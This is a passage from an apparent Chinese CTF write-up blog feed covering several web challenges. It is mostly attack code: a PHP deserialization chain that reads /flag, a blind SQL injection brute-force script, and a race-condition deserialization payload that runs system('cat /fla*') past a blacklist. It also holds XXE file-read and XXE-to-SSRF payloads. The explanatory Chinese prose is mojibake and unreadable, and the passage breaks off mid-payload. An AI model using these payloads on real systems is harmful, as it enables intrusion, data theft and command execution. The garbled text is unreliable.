class="keyword">class</span> <span class="title">Info</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$phonenumber</span>=<span class="number">123123</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$promise</span>=<span class="string">&#x27;I do&#x27;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;promise=<span class="string">&#x27;I will not !!!!&#x27;</span>;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;promise;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;file[<span class="string">&#x27;filename&#x27;</span>]-&gt;ffiillee[<span class="string">&#x27;ffiilleennaammee&#x27;</span>];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Room</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$filename</span>=<span class="string">&#x27;/flag&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$sth_to_set</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$a</span>=<span class="string">&#x27;&#x27;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__get</span>(<span class="params"><span class="variable">$name</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable">$function</span> = <span class="keyword">$this</span>-&gt;a;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$function</span>();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">Get_hint</span>(<span class="params"><span class="variable">$file</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable">$hint</span>=base64_encode(file_get_contents(<span class="variable">$file</span>));</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$hint</span>;</span><br><span class="line">        <span class="keyword">return</span> ;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__invoke</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable">$content</span> = <span class="keyword">$this</span>-&gt;Get_hint(<span class="keyword">$this</span>-&gt;filename);</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$content</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;hello&#x27;</span>]))&#123;</span><br><span class="line">    unserialize(<span class="variable">$_GET</span>[<span class="string">&#x27;hello&#x27;</span>]);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="variable">$hi</span> = <span class="keyword">new</span>  Start();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>æ„é€ å¦‚ä¸‹è„šæœ¬ç”Ÿæˆåºåˆ—åŒ–å­—ç¬¦ä¸²è½½è·ã€‚</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Start</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;name = <span class="keyword">new</span> Info();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Info</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$file</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;file[<span class="string">&#x27;filename&#x27;</span>] = <span class="keyword">new</span> Room();</span><br><span class="line">        <span class="keyword">$this</span>-&gt;file[<span class="string">&#x27;filename&#x27;</span>]-&gt;a = <span class="keyword">new</span> Room();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Room</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;filename = <span class="string">&#x27;/flag&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> serialize(<span class="keyword">new</span> Start());</span><br></pre></td></tr></table></figure><p>å°†å¾—åˆ°çš„è½½è·ä»¥ GET å‚æ•° hello å‘é€è¯·æ±‚å³å¯å¾—åˆ°å¦‚ä¸‹å­—ç¬¦ä¸²ã€‚</p><figure class="highlight plain"><figcaption><span>text</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ZmxhZ3s3MzcxOGIzMy03OWRlLTQyZmMtOWZkMi02MmEyZGE1NjJlMWN9</span><br></pre></td></tr></table></figure><p>å°†å…¶ Base64 è§£ç ä¸€æ¬¡å³å¯å¾—åˆ° flagã€‚</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;73718b33-79de-42fc-9fd2-62a2da562e1c&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>ç¾å›¢ CTF 2021</title>
      <link href="/zh-CN/posts/f43e78a1.html"/>
      <url>/zh-CN/posts/f43e78a1.html</url>
      
        <content type="html"><![CDATA[<h3 id="sql"><a href="#sql" class="headerlink" title="sql"></a>sql</h3><p>ç®€å•çš„æ­£åˆ™ç›²æ³¨ï¼Œå°†æ‰¾åˆ°çš„è„šæœ¬ç®€å•ä¿®æ”¹å³å¯è·‘å‡ºå¯†ç ã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">str_hex</span>(<span class="params">litter</span>):</span></span><br><span class="line">    <span class="built_in">str</span> = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> litter:</span><br><span class="line">        <span class="built_in">str</span> += <span class="built_in">hex</span>(<span class="built_in">ord</span>(i)).replace(<span class="string">&#x27;0x&#x27;</span>, <span class="string">&#x27;&#x27;</span>)</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;0x5e&#x27;</span> + <span class="built_in">str</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">string = string.ascii_lowercase + string.ascii_uppercase + string.digits + <span class="string">&#x27;_&#x27;</span></span><br><span class="line">flag = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">100</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> string:</span><br><span class="line">        <span class="built_in">print</span>(j)</span><br><span class="line">        url = <span class="string">&#x27;.../index.php&#x27;</span></span><br><span class="line">        data = &#123;</span><br><span class="line">            <span class="string">&#x27;username&#x27;</span>: <span class="string">&#x27;null\\&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;password&#x27;</span>: <span class="string">&#x27;||(`password`/**/regexp/**/binary/**/&#123;&#125;)#&#x27;</span>.<span class="built_in">format</span>(str_hex(flag + j))</span><br><span class="line">        &#125;</span><br><span class="line">        res = requests.post(url=url, data=data).text</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;flag&#x27;</span> <span class="keyword">in</span> res:</span><br><span class="line">            flag += j</span><br><span class="line">            <span class="built_in">print</span>(flag)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">pass</span></span><br></pre></td></tr></table></figure><p>è¿è¡Œè„šæœ¬å¯ä»¥å¾—å‡ºå¯†ç ä¸º <code>This_1s_thE_Passw0rd</code>ï¼Œä½¿ç”¨ç”¨æˆ·å <code>admin</code> é…åˆç™»å½•å³å¯è·å¾— flagã€‚</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;afccfbe8-a333-4eed-86ca-1b1967ffb0ae&#125;</span><br></pre></td></tr></table></figure><h3 id="easytricks"><a href="#easytricks" class="headerlink" title="easytricks"></a>easytricks</h3><p>å‘ç°æœ‰ <code>/admin</code> è·¯ç”±ï¼ŒåŒæ—¶å¯ä»¥æ‰¾åˆ°éƒ¨åˆ†åŸé¢˜ã€‚</p><blockquote><p><a href="https://blog.csdn.net/SopRomeo/article/details/105849403">https://blog.csdn.net/SopRomeo/article/details/105849403</a></p></blockquote><p>ä½¿ç”¨ admin ä½œä¸ºç”¨æˆ·åï¼Œå¯†ç  <code>GoODLUcKcTFer202OHAckFuN</code> å³å¯æˆåŠŸç™»å½•ä¸Šå»ã€‚ç™»å½•ä¹‹åå¯ä»¥æ‰¾åˆ°å¦‚ä¸‹æç¤ºã€‚</p><figure class="highlight plain"><figcaption><span>text</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;!-- &#x2F;admin&#x2F;admin.rar --&gt;</span><br></pre></td></tr></table></figure><p>å°†æºç ä¸‹è½½ä¸‹æ¥ï¼Œå¯ä»¥åœ¨ preload.php ä¸‹å‘ç°å¦‚ä¸‹å…³é”®çš„æºç ã€‚</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">session_save_path(<span class="string">&#x27;session&#x27;</span>);</span><br><span class="line">session_start();</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">preload</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$class</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$contents</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$method</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;class=<span class="string">&quot;&lt;?php class hacker&#123;public function hack()&#123;echo &#x27;hack the hack!I believe you can!&#x27;;&#125;&#125;\$hack=&quot;</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;contents=<span class="string">&quot;new hacker();phpinfo();&quot;</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;method=<span class="string">&quot;\$hack-&gt;hack();&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">waf</span>(<span class="params"><span class="variable">$parm</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable">$blacklist</span>=<span class="string">&quot;/flag|pcntl|system|exec|fread|file|fpassthru|popen|proc|ld|putenv|passthru|`|\.|\\\|#|\\$|[0-9]|_|get|~|\\^|eval|assert|open|write|include|require/is&quot;</span>;</span><br><span class="line">        <span class="keyword">return</span> preg_match(<span class="variable">$blacklist</span>,<span class="variable">$parm</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">write</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;waf(<span class="keyword">$this</span>-&gt;contents)||strlen(<span class="keyword">$this</span>-&gt;contents)&gt;<span class="number">60</span>||preg_match_all(<span class="string">&#x27;/\\(/i&#x27;</span>,<span class="keyword">$this</span>-&gt;contents,<span class="variable">$matches</span>)&gt;<span class="number">2</span>||preg_match_all(<span class="string">&#x27;/\\)/i&#x27;</span>,<span class="keyword">$this</span>-&gt;contents,<span class="variable">$matches</span>)&gt;<span class="number">2</span>)&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;&lt;br&gt;&quot;</span>.<span class="string">&quot;no no no&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(preg_match_all(<span class="string">&#x27;/;/i&#x27;</span>,<span class="keyword">$this</span>-&gt;contents,<span class="variable">$matches</span>)&gt;<span class="number">2</span>)&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;&lt;br&gt;&quot;</span>.<span class="string">&quot;try hard&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(file_exists(dirname(<span class="keyword">__FILE__</span>).<span class="string">&quot;/hack.php&quot;</span>))&#123;</span><br><span class="line">            unlink(dirname(<span class="keyword">__FILE__</span>).<span class="string">&quot;/hack.php&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        file_put_contents(dirname(<span class="keyword">__FILE__</span>).<span class="string">&quot;/hack.php&quot;</span>,<span class="keyword">$this</span>-&gt;class);</span><br><span class="line">        file_put_contents(dirname(<span class="keyword">__FILE__</span>).<span class="string">&quot;/hack.php&quot;</span>,<span class="keyword">$this</span>-&gt;contents,FILE_APPEND);</span><br><span class="line">        file_put_contents(dirname(<span class="keyword">__FILE__</span>).<span class="string">&quot;/hack.php&quot;</span>,<span class="keyword">$this</span>-&gt;method,FILE_APPEND);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;class=<span class="string">&quot;&lt;?php class hacker&#123;public function hack()&#123;echo &#x27;hack the hack!I believe you can!&#x27;;&#125;&#125;\$hack=&quot;</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;method=<span class="string">&quot;\$hack-&gt;hack();&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;write();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span>=<span class="variable">$_POST</span>[<span class="string">&#x27;a&#x27;</span>];</span><br><span class="line">var_dump(unserialize(<span class="variable">$a</span>));</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="variable">$preload</span>=<span class="keyword">new</span> preload();</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&lt;a href=<span class="string">&quot;./hack.php&quot;</span>&gt;hack.php&lt;/a&gt;</span><br><span class="line">&lt;a href=<span class="string">&quot;./cli.php&quot;</span>&gt;cli.php&lt;/a&gt;</span><br></pre></td></tr></table></figure><p>å¯ä»¥å‘ç°å­˜åœ¨ååºåˆ—åŒ–çš„å¯æ§åˆ¶ç‚¹ã€‚åªéœ€è¦å°†å†…å®¹æ‹¼æ¥åœ¨ <code>$this-&gt;contents</code> ä¸­å³å¯å†™å…¥åˆ° hack.php ä¸­ï¼Œä½†æ˜¯é©¬ä¸Šå°±ä¼šè¢« <code>$preload=new preload();</code> é‡æ–°è¦†ç›–æ‰ï¼Œå› æ­¤è€ƒè™‘æ¡ä»¶ç«äº‰ã€‚æ„é€ å‡ºå¦‚ä¸‹è„šæœ¬ç”Ÿæˆååºåˆ—åŒ–è½½è·ã€‚</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">preload</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$class</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$contents</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$method</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;class=<span class="string">&quot;&lt;?php class hacker&#123;public function hack()&#123;echo &#x27;hack the hack!I believe you can!&#x27;;&#125;&#125;\$hack=&quot;</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;contents=<span class="string">&quot;&#x27;a&#x27;;?&gt;&lt;?php phpinfo() ?&gt;&quot;</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;method=<span class="string">&quot;\$hack-&gt;hack();&quot;</span>;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> urlencode(serialize(<span class="keyword">new</span> preload()));</span><br></pre></td></tr></table></figure><p>å°†ç”Ÿæˆçš„è½½è·ä»¥å‚æ•° <code>a</code> æäº¤ç»™ preload çš„åŒæ—¶æ¡ä»¶ç«äº‰è®¿é—® hack.php å³æœ‰æœºä¼šè§¦å‘åˆ° phpinfoã€‚å¯ä»¥å¾—åˆ°å¦‚ä¸‹ disable_functions åˆ—è¡¨ã€‚</p><figure class="highlight plain"><figcaption><span>text</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pcntl_alarm,pcntl_fork,pcntl_waitpid,pcntl_wait,pcntl_wifexited,pcntl_wifstopped,pcntl_wifsignaled,pcntl_wifcontinued,pcntl_wexitstatus,pcntl_wtermsig,pcntl_wstopsig,pcntl_signal,pcntl_signal_get_handler,pcntl_signal_dispatch,pcntl_get_last_error,pcntl_strerror,pcntl_sigprocmask,pcntl_sigwaitinfo,pcntl_sigtimedwait,pcntl_exec,pcntl_getpriority,pcntl_setpriority,pcntl_async_signals,pcntl_unshare,</span><br></pre></td></tr></table></figure><p>å¯ä»¥å‘ç°å…¶ä¸­æ²¡æœ‰è¿‡æ»¤ <code>system()</code>ï¼Œå› æ­¤åªéœ€è¦æ‹¼æ¥ä¸€ä¸‹å³å¯è¿è¡Œä»è€Œå¾—åˆ° flagã€‚æ„é€ å‡ºå¦‚ä¸‹è½½è·ã€‚</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">implode([<span class="string">&quot;sys&quot;</span>, <span class="string">&quot;tem&quot;</span>])(<span class="string">&quot;cat /fla*&quot;</span>)</span><br></pre></td></tr></table></figure><p>å°†å…¶æ‹¼æ¥åœ¨ <code>$this-&gt;contents</code> ä¸­é‡æ–°ç”Ÿæˆè½½è·ç„¶åæ¡ä»¶ç«äº‰å³å¯å¾—åˆ° flagã€‚</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;7b154242-df8e-47df-81dd-4807644335fa&#125;</span><br></pre></td></tr></table></figure><h3 id="xx-elogin"><a href="#xx-elogin" class="headerlink" title="xx_elogin"></a>xx_elogin</h3><p>ç™»å½•é¡µé¢çš„æºç å¯ä»¥çœ‹å‡º <code>/api.php</code> çš„ XXEï¼Œç®€å•æ„é€ å‡ºå¦‚ä¸‹è½½è·è¯»å–æ–‡ä»¶ã€‚</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">foo</span> [</span></span><br><span class="line"><span class="meta">  <span class="meta">&lt;!ELEMENT <span class="meta-keyword">foo</span> <span class="meta-keyword">ANY</span> &gt;</span></span></span><br><span class="line"><span class="meta">  <span class="meta">&lt;!ENTITY <span class="meta-keyword">xxe</span> <span class="meta-keyword">PUBLIC</span> <span class="meta-string">&quot;&quot;</span> <span class="meta-string">&quot;php://filter/convert.base64-encode/resource=api.php&quot;</span> &gt;</span>]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">foo</span>&gt;</span><span class="symbol">&amp;xxe;</span><span class="tag">&lt;/<span class="name">foo</span>&gt;</span></span><br></pre></td></tr></table></figure><p>å¯ä»¥è¯»åˆ°å¦‚ä¸‹æºç ã€‚</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">session_start();</span><br><span class="line"><span class="variable">$username</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;username&#x27;</span>];</span><br><span class="line"><span class="variable">$password</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;password&#x27;</span>];</span><br><span class="line"><span class="comment">// å“ˆå“ˆï¼Œæˆ‘æ•°æ®åº“éƒ½ä¸ç”¨ä½ è¿˜èƒ½ç§’æˆ‘ã€‚</span></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$username</span> === <span class="string">&#x27;guest&#x27;</span> &amp;&amp; <span class="variable">$password</span> === <span class="string">&#x27;guest111222333444555666@#$!&#x27;</span>)&#123;</span><br><span class="line">    <span class="variable">$_SESSION</span>[<span class="string">&#x27;is_admin&#x27;</span>] = <span class="string">&#x27;0&#x27;</span>;</span><br><span class="line">    header(<span class="string">&quot;Location:guest.php&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">elseif</span>(<span class="variable">$username</span> === <span class="string">&#x27;admin&#x27;</span> &amp;&amp; <span class="variable">$password</span> === <span class="string">&#x27;admin&#x27;</span> &amp;&amp; <span class="variable">$_SERVER</span>[<span class="string">&#x27;REMOTE_ADDR&#x27;</span>] == <span class="string">&#x27;127.0.0.1&#x27;</span>)&#123;</span><br><span class="line">    <span class="comment">// ä»…å…è®¸ç®¡ç†å‘˜ä»æœ¬åœ°è®¿é—®ï¼Œè¿™æ ·æ€»å®‰å…¨äº†å§ï¼ï¼ï¼</span></span><br><span class="line">    <span class="variable">$_SESSION</span>[<span class="string">&#x27;is_admin&#x27;</span>] = <span class="string">&#x27;1&#x27;</span>;</span><br><span class="line">    <span class="keyword">include</span>(<span class="string">&#x27;admin.php&#x27;</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;username or password error&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>å¯ä»¥å¾—åˆ°ä¸¤ä»½å¯†ç ï¼ŒåŒæ—¶è€ƒè™‘ä½¿ç”¨ SSRF æ¥ç™»å½•ç®¡ç†å‘˜è´¦æˆ·ï¼Œå› æ­¤è€ƒè™‘ä½¿ç”¨ XXE æ¥è¿›è¡Œ SSRFã€‚å¯ä»¥å‘ç°å¦‚ä¸‹è¿‡æ»¤ã€‚</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    error_reporting(<span class="number">0</span>);</span><br><span class="line">    <span class="variable">$xmlfile</span> = file_get_contents(<span class="string">&quot;php://input&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span>(preg_match(<span class="string">&#x27;/system/i&#x27;</span>,<span class="variable">$xmlfile</span>))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;hacker go out!&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(preg_match(<span class="string">&#x27;/http/i&#x27;</span>,<span class="variable">$xmlfile</span>) &amp;&amp; preg_match(<span class="string">&#x27;/dtd|ENTITY/i&#x27;</span>,<span class="variable">$xmlfile</span>))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;ç¦æ­¢å‡ºç½‘&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable">$dom</span> = <span class="keyword">new</span> DOMDocument();</span><br><span class="line">    <span class="variable">$dom</span>-&gt;loadXML(<span class="variable">$xmlfile</span>,LIBXML_NOENT | LIBXML_DTDLOAD);</span><br><span class="line">    <span class="variable">$result</span> = simplexml_import_dom(<span class="variable">$dom</span>);</span><br><span class="line">    <span class="variable">$result</span> = sprintf(<span class="string">&quot;&lt;result&gt;&lt;msg&gt;%s&lt;/msg&gt;&lt;/result&gt;&quot;</span>,<span class="variable">$result</span>); </span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$result</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>æ­¤æ—¶å¯ä»¥ä½¿ç”¨ UTF-16 ç¼–ç æ¥ç»•è¿‡åˆ¤æ–­ä»è€Œè¾¾æˆ SSRFã€‚</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$REAL_PAYLOAD</span> = <span class="string">&quot;http://127.0.0.1:80/login.php&quot;</span>;</span><br><span class="line"><span class="variable">$XXE_PAYLOAD</span> = <span class="comment">/** <span class="doctag">@lang</span> text */</span></span><br><span class="line">    &lt;&lt;&lt;PAYLOAD</span><br><span class="line">&lt;!DOCTYPE foo [</span><br><span class="line">  &lt;!ELEMENT foo ANY &gt;</span><br><span class="line">  &lt;!ENTITY xxe <span class="keyword">PUBLIC</span> <span 